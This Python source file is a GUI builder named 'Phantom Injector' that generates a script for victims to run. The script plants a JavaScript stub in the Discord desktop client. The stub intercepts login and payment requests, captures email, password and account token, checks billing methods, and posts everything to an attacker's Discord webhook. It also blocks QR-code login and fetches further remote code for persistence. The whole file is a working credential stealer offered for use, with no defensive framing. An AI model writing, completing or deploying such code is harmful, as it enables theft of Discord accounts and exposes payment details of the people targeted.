import tkinter as tk
from tkinter import simpledialog, messagebox, filedialog
from pathlib import Path
import os

DARK_BLUE = "#0a1f44"
BLACK = "#000000"
WHITE = "#ffffff"

# ────────────────────────────────────────────────
# FULL JAVASCRIPT PAYLOAD
# ────────────────────────────────────────────────
JS_TEMPLATE = r'''
const fs = require('fs');
const path = require('path');
const https = require('https');
const { BrowserWindow, session } = require('electron');
const config = {
  webhook: '{webhook}',
  auto_buy_nitro: false,
  ping_on_run: true,
  ping_val: '@everyone',
  embed_name: 'Stolen Information - Phantom',
  footer_text: 'Phantom Injection',
  embed_color: 0x11025e,
  injection_url: '',
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};
const discordPath = (() => {
  const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;
  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }
  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();
function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify({
        name: 'discord',
        main: 'index.js',
      }, null, 4),
    );
    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs.replace(/\\/g, '\\\\')}';
const bdPath = '${bdPath.replace(/\\/g, '\\\\')}';
const fileSize = fs.statSync(indexJs).size;
fs.readFile(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')")
        init();
});
async function init() {
    https.get('${config.injection_url}', (res) => {
        if (res.statusCode !== 200) return;
        const file = fs.createWriteStream(indexJs);
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            body = body.replace('%WEBHOOK_HERE%', '${config.webhook}');
            fs.writeFileSync(indexJs, body);
            file.close();
        });
    }).on("error", () => setTimeout(init, 10000));
}
require('${path.join(resourcePath, 'app.asar').replace(/\\/g, '\\\\')}');
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript);
  }
}
const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, true);
};
const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};
const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText`);
  if (!bill || bill.length === 0) return [];
  return JSON.parse(bill);
};
const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data.length) return 'None';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      if (x.type === 1) billing += '[CARD] ';
      if (x.type === 2) billing += '[PAYPAL] ';
    }
  });
  return billing || 'None';
};
const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const req = https.request({
    hostname: url.hostname,
    path: url.pathname,
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  });
  req.on('error', console.error);
  req.write(data);
  req.end();
};
const login = async (email, password, token) => {
  const json = await getInfo(token).catch(() => ({}));
  const content = {
    username: config.embed_name,
    embeds: [{
      color: config.embed_color,
      title: `Discord Injection [Login]`,
      fields: [
        { name: ':e_mail: Email:', value: `\`\`\`${email}\`\`\``, inline: false },
        { name: ':key: Password:', value: `\`\`\`${password}\`\`\``, inline: false },
        { name: ':globe_with_meridians: Token:', value: `\`\`\`${token}\`\`\``, inline: false },
      ],
      author: {
        name: json.username ? \`\${json.username}#\${json.discriminator} (\${json.id})\` : 'Unknown User',
        icon_url: json.avatar ? \`https://cdn.discordapp.com/avatars/\${json.id}/\${json.avatar}.webp\` : null
      },
      footer: { text: config.footer_text }
    }]
  };
  if (config.ping_on_run) content.content = config.ping_val;
  await hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
  callback({});
});
session.defaultSession.webRequest.onCompleted(config.filter, async (details) => {
  if (![200, 202].includes(details.statusCode)) return;
  try {
    const uploadData = details.uploadData?.[0]?.bytes;
    if (!uploadData) return;
    const data = JSON.parse(Buffer.from(uploadData).toString());
    const token = await execScript(
      `(webpackChunkdiscord_app?.push([[''],{m:{}},e=>{for(let c in e.c)m[e.c[c]];for(let m of Object.values(m))if(m?.exports?.default?.getToken)return m.exports.default.getToken()})])||null`
    );
    if (details.url.endsWith('login') && data.login && data.password && token) {
      await login(data.login, data.password, token);
    }
  } catch {}
});
module.exports = require('./core.asar');
'''

def generate_injector_script(webhook: str, output_path: str):
    injector_code = f'''import os
from pathlib import Path
import json

WEBHOOK = "{webhook}"

def find_discord_resources():
    appdata = os.getenv("LOCALAPPDATA")
    if not appdata: return []
    base = Path(appdata)
    return [base / v / "resources" for v in ["Discord", "discordcanary", "discordptb"] if (base / v / "resources").exists()]

def inject(resources_path: Path):
    try:
        app = resources_path / "app"
        app.mkdir(exist_ok=True)
        (app / "package.json").write_text(json.dumps({{"name": "discord", "main": "index.js"}}, indent=2), encoding="utf-8")
        
        js_content = {repr(JS_TEMPLATE)[1:-1].replace("{WEBHOOK}", "' + WEBHOOK + '")}
        (app / "index.js").write_text(js_content, encoding="utf-8")
        print(f"Injected: {{resources_path}}")
    except Exception as e:
        print(f"Failed {{resources_path}}: {{e}}")

for res in find_discord_resources():
    inject(res)

print("\\nInjection attempt finished. Restart Discord.")
input("Press Enter to exit...")
'''

    Path(output_path).write_text(injector_code, encoding="utf-8")
    return output_path

def on_generate():
    webhook = simpledialog.askstring("Webhook", "Enter Discord Webhook URL:", parent=root)
    if not webhook or not webhook.startswith("https://discord.com/api/webhooks/"):
        messagebox.showerror("Error", "Valid webhook required.")
        return

    filename = filedialog.asksaveasfilename(
        defaultextension=".py",
        filetypes=[("Python file", "*.py")],
        title="Save injector as..."
    )
    if not filename:
        return

    try:
        generated = generate_injector_script(webhook, filename)
        messagebox.showinfo("Success", f"Injector script created:\n{generated}\n\nGive this file to the target — when they run it, it will attempt the injection on their PC.")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to save file:\n{e}")

# GUI
root = tk.Tk()
root.title("Phantom Injector Builder")
root.geometry("400x220")
root.configure(bg=DARK_BLUE)

tk.Label(root, text="Phantom Injector Generator", font=("Arial", 14, "bold"), bg=DARK_BLUE, fg=WHITE).pack(pady=20)

btn = tk.Button(root, text="Generate Injector Script", command=on_generate, bg=BLACK, fg=WHITE, font=("Arial", 12), width=25, height=2)
btn.pack(pady=10)

tk.Label(root, text="Creates a .py file that injects the stub into Discord when run by the victim.", wraplength=360, justify="center", bg=DARK_BLUE, fg="#aaaaaa", font=("Arial", 9)).pack(pady=20)

root.mainloop()
